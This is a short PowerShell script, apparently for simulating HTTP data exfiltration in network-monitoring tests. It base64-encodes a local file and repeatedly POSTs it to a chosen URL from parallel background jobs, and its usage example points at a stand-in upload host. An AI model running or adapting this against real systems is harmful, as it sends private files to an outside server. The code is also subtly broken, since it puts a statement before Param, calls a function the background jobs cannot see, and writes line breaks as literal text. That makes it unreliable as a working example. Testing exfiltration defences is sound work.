<#

.SYNOPSIS
Helps simulate HTTP exfiltration.

.DESCRIPTION
Gets content of input file and send its base64 version in a single request to the url of your choice.
You can consider generating a random file (head -c 1M </dev/urandom > 1MB.pdf)

.EXAMPLE
./exf_snipper.ps1 50 10 "http://xxx.co.uk/upload.php" "c:\1MB.pdf"

#>

function HTTP-exfil($iter,$jb,$url,$filepath) {
	$ScriptBlock = {
		$boundary = GenerateBoundary
		Param($iter,$url,$filepath)
		$i=1
		Do {
			$k = 1
			$header= '--' + $boundary + '\r\nContent-Disposition: form-data; name="uploaded_file"; filename="chunk.pdf"\r\nContent-Type: application/pdf\r\n\r\n'
			$data = Get-Content -Path $filepath
	
			$data = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data))
			
			$endbytes = "--" + $boundary + "--"
			$bufferend = [text.encoding]::ascii.getbytes($endbytes)
			$newlinebytes = "\r\n"
			$buffernewlinebytes = [text.encoding]::ascii.getbytes($newlinebytes)
			$bufferheader = [text.encoding]::ascii.getbytes($header)
			
			$buffer = [text.encoding]::ascii.getbytes($data)

			[net.httpWebRequest] $req = [net.webRequest]::create($url)
			$req.method = "POST"
			$req.ContentType = "multipart/form-data; boundary=" + $boundary
			$req.ContentLength = $buffer.length + $bufferheader.length + $buffernewlinebytes.length + $bufferend.length
			$req.KeepAlive = "true"
			$req.TimeOut = 2000
			$reqst = $req.getRequestStream()
			
			$reqst.write($bufferheader, 0, $bufferheader.length)
			$reqst.write($buffer, 0, $buffer.length)
			$reqst.write($buffernewlinebytes, 0, $buffernewlinebytes.length)
			$reqst.write($bufferend, 0, $bufferend.length)
			$reqst.flush()
			$reqst.close()
			[net.httpWebResponse] $res = $req.getResponse()
			$resst = $res.getResponseStream()
			$res.close()
			
			$i++
			Start-sleep -s 1
		}
		While ($i -le [int]$iter)
	}
	$j = 1
	Do {
		Start-Job $ScriptBlock -ArgumentList $iter,$url,$filepath
		$j++
	}
	While ($j -le [int]$jb)

	Get-Job | Wait-Job | Receive-Job
}

function GenerateBoundary {
	$RandomBoundary = -join ((1..9) + (1..9) + (1..9) + 1 | Get-Random -Count 28 )
	"-----------------------------" + $RandomBoundary
}
